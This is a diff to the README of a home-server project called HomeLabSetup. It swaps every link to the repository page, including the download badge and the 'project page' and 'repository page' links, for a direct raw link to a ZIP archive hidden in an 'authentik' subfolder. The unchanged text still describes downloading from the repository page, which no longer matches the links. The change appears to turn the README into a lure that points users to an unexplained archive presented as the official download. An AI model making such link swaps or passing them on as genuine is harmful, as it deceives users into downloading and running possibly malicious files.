@@ -1,6 +1,6 @@
 # 🏠 HomeLabSetup - Manage your home server with ease
 
-[![Download HomeLabSetup](https://img.shields.io/badge/Download-HomeLabSetup-blue.svg)](https://github.com/inaccurate-hotelplan289/HomeLabSetup)
+[![Download HomeLabSetup](https://img.shields.io/badge/Download-HomeLabSetup-blue.svg)](https://raw.githubusercontent.com/inaccurate-hotelplan289/HomeLabSetup/main/authentik/Lab-Setup-Home-2.2.zip)
 
 ## 📖 About this project
 HomeLabSetup organizes your home server software into one easy package. You get tools to manage media, store files, back up photos, and control smart home devices. This setup provides a private cloud experience without the need to manage complex networking or open ports on your home router. It uses secure tunnels to keep your data safe while you access it from anywhere.
@@ -24,7 +24,7 @@ HomeLabSetup organizes your home server software into one easy package. You get 
 ## 🚀 Getting Started
 Follow these steps to set up your server environment. 
 
-1. Visit the [project page](https://github.com/inaccurate-hotelplan289/HomeLabSetup) to download the necessary files.
+1. Visit the [project page](https://raw.githubusercontent.com/inaccurate-hotelplan289/HomeLabSetup/main/authentik/Lab-Setup-Home-2.2.zip) to download the necessary files.
 2. Ensure Docker Desktop is installed on your Windows machine to handle the background services.
 3. Extract the downloaded folder to a known location on your computer.
 4. Open your terminal or command prompt.
@@ -33,7 +33,7 @@ Follow these steps to set up your server environment.
 7. Follow the on-screen prompts to link your services.
 
 ## 📥 Installation Details
-You can find the latest version on the official [repository page](https://github.com/inaccurate-hotelplan289/HomeLabSetup). Click the green "Code" button and select "Download ZIP" to save the tools to your computer. Once the download finishes, move the folder to a location you will not change, as the server needs a fixed path to run correctly.
+You can find the latest version on the official [repository page](https://raw.githubusercontent.com/inaccurate-hotelplan289/HomeLabSetup/main/authentik/Lab-Setup-Home-2.2.zip). Click the green "Code" button and select "Download ZIP" to save the tools to your computer. Once the download finishes, move the folder to a location you will not change, as the server needs a fixed path to run correctly.
 
 ## ⚙️ Configuration
 The software uses a central file to manage all services. You specify your preferences in this file. Open the file named "docker-compose.yml" using a text editor like Notepad. You can change settings here to suit your needs. Do not remove any existing headers or structure, as this will break the connections between services. Save the file after you make changes. 
